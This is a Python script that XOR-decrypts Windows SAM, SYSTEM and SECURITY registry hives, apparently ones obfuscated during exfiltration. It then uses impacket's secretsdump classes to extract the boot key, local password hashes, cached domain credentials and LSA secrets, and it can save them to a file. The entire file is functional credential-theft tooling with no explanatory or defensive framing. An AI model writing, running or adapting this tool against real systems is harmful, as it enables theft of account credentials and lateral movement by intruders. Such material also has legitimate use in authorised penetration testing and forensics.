import argparse
import os
from impacket.examples import secretsdump
from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets
from tqdm import tqdm


def xor_file(input_file, output_file, key):
    with open(input_file, 'rb') as f_in:
        with open(output_file, 'wb') as f_out:
            i = 0
            file_size = os.path.getsize(input_file)
            with tqdm(total=file_size, unit='B', unit_scale=True, desc=f'Decrypting {input_file}') as pbar:
                while True:
                    chunk = f_in.read(4096)
                    if len(chunk) == 0:
                        break
                    chunk = bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(chunk)])
                    f_out.write(chunk)
                    pbar.update(len(chunk))
                    i += 1
                    
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Decrypt SAM, SYSTEM, and SECURITY files using XOR operation and extract password hashes.')
    parser.add_argument('sam_file', type=str, help='The path to the SAM file.')
    parser.add_argument('system_file', type=str, help='The path to the SYSTEM file.')
    parser.add_argument('security_file', type=str, help='The path to the SECURITY file.')
    parser.add_argument('key', type=str, help='The key for decryption.')
    parser.add_argument('--output_file', type=str, help='The path to the output file to save the extracted hashes.')

    args = parser.parse_args()

    # Create the "HIVES" subdirectory if it doesn't exist
    os.makedirs("HIVES", exist_ok=True)


    xor_file(args.system_file, 'HIVES/decrypted_SYSTEM', args.key)
    localOps = LocalOperations(systemHive='HIVES/decrypted_SYSTEM')
    bootKey = localOps.getBootKey()
    


    xor_file(args.sam_file, 'HIVES/decrypted_SAM', args.key)
    
    xor_file(args.security_file, 'HIVES/decrypted_SECURITY', args.key)
    print("Bootkey : " + bootKey.hex() + "\n")
    try:
        SAMHashesObj = SAMHashes('HIVES/decrypted_SAM', bootKey, isRemote=False)
        SAMHashesObj.dump()
        if args.output_file is not None:
            SAMHashesObj.export(args.output_file)
    except Exception as e:
        print('SAM hashes extraction failed: %s' % str(e))

   
    
    try:
        LSASecretsObj = LSASecrets('HIVES/decrypted_SECURITY', bootKey, localOps, isRemote=False, history=False)
        LSASecretsObj.dumpCachedHashes()
        if args.output_file is not None:
            LSASecretsObj.exportCached(args.output_file)
        LSASecretsObj.dumpSecrets()
        print()
        if args.output_file is not None:
            LSASecretsObj.exportSecrets(args.output_file)
    except Exception as e:
        print('LSA hashes extraction failed: %s' % str(e))
